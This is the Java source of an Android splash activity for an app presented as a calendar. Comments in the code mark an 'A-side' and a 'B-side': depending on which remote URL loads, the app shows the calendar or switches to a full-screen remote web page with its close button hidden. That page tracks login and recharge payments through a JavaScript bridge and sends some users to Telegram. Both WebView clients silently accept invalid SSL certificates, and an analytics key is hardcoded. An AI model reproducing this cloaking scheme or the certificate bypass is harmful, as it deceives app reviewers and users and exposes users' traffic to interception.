package com.manage.calendar;

import android.app.Dialog;
import android.content.ClipboardManager;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ActivityInfo;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.net.http.SslError;
import android.os.Build;
import android.os.Bundle;
import android.os.CountDownTimer;
import android.os.Handler;
import android.os.Message;
import android.provider.Settings;
import android.util.Log;
import android.view.View;
import android.webkit.CookieManager;
import android.webkit.JavascriptInterface;
import android.webkit.SslErrorHandler;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.LinearLayout;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.constraintlayout.widget.ConstraintLayout;

import com.appsflyer.AFInAppEventParameterName;
import com.appsflyer.AFInAppEventType;
import com.appsflyer.AppsFlyerLib;
import com.appsflyer.attribution.AppsFlyerRequestListener;
import com.manage.calendar.databinding.ActivitySplashBinding;
import com.manage.calendar.utils.ClickDelay;
import com.manage.calendar.widget.SPHelper;
import com.manage.calendar.base.BaseActivity;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;
import java.util.Map;
import java.util.Timer;
import java.util.TimerTask;

public class CSplashActivity extends BaseActivity<ActivitySplashBinding> implements View.OnClickListener {

    private boolean isFirstControl = false;

    private boolean isEnter = false;

    private Dialog mDialog;


    @Override
    public void initParamConfig() {
        super.initParamConfig();
        setHideTitleBar(false);
        setloadingState(false);
    }

    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        isRootActivity();
        super.onCreate(savedInstanceState);

        AppsFlyerLib.getInstance().start(getApplicationContext(), "ewoxyEdQxYHrhU7QGHorrP", new AppsFlyerRequestListener() {
            @Override
            public void onSuccess() {
                Log.d("TAG", "Launch sent successfully, got 200 response code from server");
            }

            @Override
            public void onError(int i, @NonNull String s) {
                Log.d("TAG", "Launch failed to be sent:\n" +
                        "Error code: " + i + "\n"
                        + "Error description: " + s);
            }
        });

    }

    @Override
    public void onBackPressed() {
        if(mBinding.web.canGoBack()) {
            mBinding.web.goBack();
        } else {
            super.onBackPressed();
        }
    }

    @Override
    public void onClick(View v) {
        if (!ClickDelay.isFastClick()) {
            return;
        }
    }

    @Override
    public ActivitySplashBinding setViewBinding() {
        return ActivitySplashBinding.inflate(layoutInflater);
    }

    @Override
    public void onInitView(Bundle savedInstanceState) {

        isFirstControl = SPHelper.getInstance().getBoolean(Constant.APP_START, false);
        if (!isFirstControl) {
            mBinding.llStartImage.setVisibility(View.GONE);
            mBinding.loginView.setVisibility(View.VISIBLE);
            isEnter = true;
        }else{
            mBinding.llStartImage.setVisibility(View.VISIBLE);
            isEnter = false;
        }

        initWebView();

    }
    public void initWebView() {

        mBinding.web.setWebViewClient(new WebViewClient(){
            @Override
            public void onReceivedSslError(WebView view, SslErrorHandler handler, SslError error){
                Log.e("tag"," SslError="+error);
                //证书信任
                handler.proceed();
            }
        });

        mBinding.web.getSettings().setBuiltInZoomControls(false);
        mBinding.web.getSettings().setDomStorageEnabled(true);
        mBinding.web.requestFocusFromTouch();

        mBinding.web.getSettings().setJavaScriptEnabled(true);
        mBinding.web.getSettings().setDisplayZoomControls(false);
        mBinding.web.getSettings().setSupportZoom(false);

        mBinding.web.setWebViewClient(new WebViewClient(){
            @Override
            public boolean shouldOverrideUrlLoading(WebView view, String url) {
                Log.e("TAG","跳转URL......." + url);
                if(url.contains("t.me/")){
                    Message message = new Message();
                    message.what = 2;
                    message.obj = url;
                    mHandler.sendMessage(message);
                }else{
                    view.loadUrl(url); // 根据传入的参数再去加载新的网页
                }
                return true; // 表示当前WebView可以处理打开新网页的请求，不用借助系统浏览器
            }

            @Override
            public void onPageFinished(WebView view, String url) {
                super.onPageFinished(view, url);
            }
            @Override
            public void onReceivedSslError(WebView view, SslErrorHandler handler, SslError error) {
                if (handler != null) {
                    handler.proceed();//忽略证书
                }
            }
            @Override
            public void onLoadResource(WebView view, String url) {
                Log.e("tag"," onLoadResource="+url);
                if (url.contains("j5qtyc.one/wap.html")){  //————————A面
                    isEnter = false;
                    startToMain();
                }else{  //进入广告页面+——客户端监听该地址的返回，如果http状态码非200时，删除该webview的关闭按钮，并且将尺寸改为全屏展示我们的B面网址//————————B面
                    mBinding.llStartImage.setVisibility(View.GONE);
                    mHandler.sendEmptyMessage(1);
                    mBinding.loginView.setVisibility(View.VISIBLE);
                    mBinding.ivClose.setVisibility(View.GONE);
                }
                super.onLoadResource(view, url);
            }
        });

        mBinding.web.addJavascriptInterface(new CSplashActivity.JavaAndJsCallInterface(), "jsBridge");
//        mBinding.web.loadUrl("https://api.gilet.ceshi.in/testwsd.html");
//        mBinding.web.loadUrl("https://nojump.gilet.ceshi.in/wap.html");

        mBinding.web.loadUrl("https://j5qtyc.one/wap.html");

        mBinding.ivClose.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                mBinding.llStartImage.setVisibility(View.VISIBLE);
                mBinding.loginView.setVisibility(View.GONE);
                isEnter = false;
                startToMain();
            }
        });


    }

    @Override
    public void onInitData() {
    }

    private CountDownTimer timer;
    private void startToMain() {
        timer = new CountDownTimer(2000, 100) {
            @Override
            public void onTick(long millisUntilFinished) {

            }

            @Override
            public void onFinish() {
                if (!isEnter) {
                    isEnter = true;
                    SPHelper.getInstance().setBoolean(Constant.APP_START, true);
                    startActivity(new Intent(mContext, MainActivity.class));
                    finish();
                }
            }
        };

        timer.start();
    }

    @Override
    protected void onDestroy() {
        if (timer != null) {
            timer.cancel();
            timer = null;
        }

        if (mDialog != null) {
            mDialog.dismiss();
            mDialog = null;
        }
        super.onDestroy();
    }

    private void isRootActivity() {
        if (!this.isTaskRoot()) {
            if (getIntent() != null) {
                String action = getIntent().getAction();
                if (getIntent().hasCategory(Intent.CATEGORY_LAUNCHER) && Intent.ACTION_MAIN == action) {
                    finish();
                    return;
                }
            }
        }
    }

    class JavaAndJsCallInterface{

        @JavascriptInterface
        public String postMessage(String method, String dataJson) {
            Log.e("TAG","......postMessage:"+method);
            //根据method参数处理不同事件
            switch (method) {
                case "login":
                    try {
                        JSONObject loginJson = new JSONObject(dataJson);
                        Map<String, Object> loginMap = new HashMap<String, Object>();
                        loginMap.put("success", loginJson.getInt("success"));
                        Log.d("TAG", "login--------:" + loginMap.toString());
                        AppsFlyerLib.getInstance().logEvent(getApplicationContext(),
                                "login", loginMap,new AppsFlyerRequestListener() {
                                    @Override
                                    public void onSuccess() {
                                        Log.d("TAG", "Event sent successfully");
                                    }
                                    @Override
                                    public void onError(int i, @NonNull String s) {
                                        Log.d("TAG", "Event failed to be sent:\n" +
                                                "Error code: " + i + "\n"
                                                + "Error description: " + s);
                                    }
                                });
                    } catch (JSONException e) {
                        throw new RuntimeException(e);
                    }


                    break;
                case "register":
                    try {
                        JSONObject registerJson = new JSONObject(dataJson);
                        Map<String, Object> registerMap = new HashMap<String, Object>();
                        registerMap.put("success", registerJson.getInt("success"));
                        Log.d("TAG", "register--------:" + registerMap.toString());
                        AppsFlyerLib.getInstance().logEvent(getApplicationContext(),
                                "register", registerMap,new AppsFlyerRequestListener() {
                                    @Override
                                    public void onSuccess() {
                                        Log.d("TAG", "Event sent successfully");
                                    }
                                    @Override
                                    public void onError(int i, @NonNull String s) {
                                        Log.d("TAG", "Event failed to be sent:\n" +
                                                "Error code: " + i + "\n"
                                                + "Error description: " + s);
                                    }
                                });
                    } catch (JSONException e) {
                        throw new RuntimeException(e);
                    }

                    break;
                case "firstrecharge":
                    try {
                        JSONObject firstrechargeJson = new JSONObject(dataJson);
                        Map<String, Object> firstrechargeMap = new HashMap<String, Object>();
                        firstrechargeMap.put("success", firstrechargeJson.getInt("success"));
                        firstrechargeMap.put("isFirst", firstrechargeJson.getInt("isFirst"));
                        firstrechargeMap.put("af_revenue", firstrechargeJson.getString("amount"));
                        firstrechargeMap.put("currency", firstrechargeJson.getString("currency"));
                        Log.d("TAG", dataJson.toString()+"firstrecharge--------:" + firstrechargeMap.toString());
                        Log.d("TAG", "firstrecharge0000000000000--------:" + jsonToMap(new JSONObject(dataJson)).toString());
                        AppsFlyerLib.getInstance().logEvent(getApplicationContext(),
                                "firstrecharge", firstrechargeMap,new AppsFlyerRequestListener() {
                                    @Override
                                    public void onSuccess() {
                                        Log.d("TAG", "Event sent successfully");
                                    }
                                    @Override
                                    public void onError(int i, @NonNull String s) {
                                        Log.d("TAG", "Event failed to be sent:\n" +
                                                "Error code: " + i + "\n"
                                                + "Error description: " + s);
                                    }
                                });
                    } catch (JSONException e) {
                        throw new RuntimeException(e);
                    }

                    break;
                case "recharge":
                    try {
                        JSONObject rechargeJson = new JSONObject(dataJson);
                        Map<String, Object> rechargeMap = new HashMap<String, Object>();
                        rechargeMap.put("success", rechargeJson.getInt("success"));
                        rechargeMap.put("isFirst", rechargeJson.getInt("isFirst"));
                        rechargeMap.put("af_revenue", rechargeJson.getString("amount"));
                        rechargeMap.put("currency", rechargeJson.getString("currency"));
                        Log.d("TAG", "recharge--------:" + rechargeMap.toString());
                        AppsFlyerLib.getInstance().logEvent(getApplicationContext(),
                                "recharge", rechargeMap,new AppsFlyerRequestListener() {
                                    @Override
                                    public void onSuccess() {
                                        Log.d("TAG", "Event sent successfully");
                                    }
                                    @Override
                                    public void onError(int i, @NonNull String s) {
                                        Log.d("TAG", "Event failed to be sent:\n" +
                                                "Error code: " + i + "\n"
                                                + "Error description: " + s);
                                    }
                                });
                    } catch (JSONException e) {
                        throw new RuntimeException(e);
                    }

                    break;

                case "openWindow":
                    new Handler().postDelayed(new Runnable() {

                        @Override
                        public void run() {
                            try {
                                JSONObject jsonObject = new JSONObject(dataJson);
                                Log.e("TAG","openwindow......." + jsonObject.getString("url"));

                                if (jsonObject.getString("url").contains("download/")){
                                    Message message = new Message();
                                    message.what = 0;
                                    message.obj = jsonObject.getString("url");
                                    mHandler.sendMessage(message);
                                }else{
                                    Message message = new Message();
                                    message.what = 3;
                                    message.obj = jsonObject.getString("url");
                                    mHandler.sendMessage(message);
                                }

                            } catch (JSONException e) {
                                throw new RuntimeException(e);
                            }
                        }
                    },100);

                    break;
            }
            // 有返回值时返回具体数据，没有时返回空字符串
            return "";
        }
    }

    private Handler mHandler = new Handler(){
        @Override
        public void handleMessage(@NonNull Message msg) {
            switch (msg.what){
                case 0:
                    Intent intent = new Intent(Intent.ACTION_VIEW);
                    intent.addCategory(Intent.CATEGORY_BROWSABLE);
                    intent.setData(Uri.parse(msg.obj.toString()));
                    startActivity(intent);
                    break;
                case 1:
                    ConstraintLayout.LayoutParams layoutParams = (ConstraintLayout.LayoutParams)mBinding.ivWebviewView.getLayoutParams();
                    layoutParams.setMargins(0, 0, 0, 0); // 设置左右间距为32dp
                    mBinding.ivWebviewView.setLayoutParams(layoutParams);
                    break;
                case 2:
                    //监听telegram
                    if(isAppInstalled(CSplashActivity.this,"org.telegram.messenger.web")){
                        //手机上已有当前应用
                        Intent telegramIntent = CSplashActivity.this.getPackageManager().getLaunchIntentForPackage("org.telegram.messenger.web");
                        if (telegramIntent != null) {
                            telegramIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                            startActivity(telegramIntent);
                        }
                    }else{
                        //跳转外部浏览器
                        Intent openIntent = new Intent(Intent.ACTION_VIEW);
                        openIntent.addCategory(Intent.CATEGORY_BROWSABLE);
                        openIntent.setData(Uri.parse(msg.obj.toString()));
                        startActivity(openIntent);
                    }
                    break;
                case 3:
                    mBinding.web.loadUrl(msg.obj.toString());
                    break;
            }
            super.handleMessage(msg);
        }
    };

    private boolean isAppInstalled(Context context, String packageName) {
        try {
            context.getPackageManager().getApplicationInfo(packageName, 0);
            return true;
        } catch (PackageManager.NameNotFoundException e) {
            return false;
        }
    }

    public static Map<String, Object> jsonToMap(JSONObject json) throws JSONException {
        Map<String, Object> map = new HashMap<String, Object>();

        Iterator<String> keys = json.keys();
        while (keys.hasNext()) {
            String key = keys.next();
            Object value = json.get(key);

            if (value instanceof JSONObject) {
                value = jsonToMap((JSONObject) value);
            } else if (value instanceof JSONArray) {
                value = jsonArrayToList((JSONArray) value);
            }

            map.put(key, value);
        }

        return map;
    }
    public static List<Object> jsonArrayToList(JSONArray array) throws JSONException {
        List<Object> list = new ArrayList<Object>();
        for (int i = 0; i < array.length(); i++) {
            Object value = array.get(i);
            if (value instanceof JSONObject) {
                value = jsonToMap((JSONObject) value);
            } else if (value instanceof JSONArray) {
                value = jsonArrayToList((JSONArray) value);
            }
            list.add(value);
        }
        return list;
    }

}
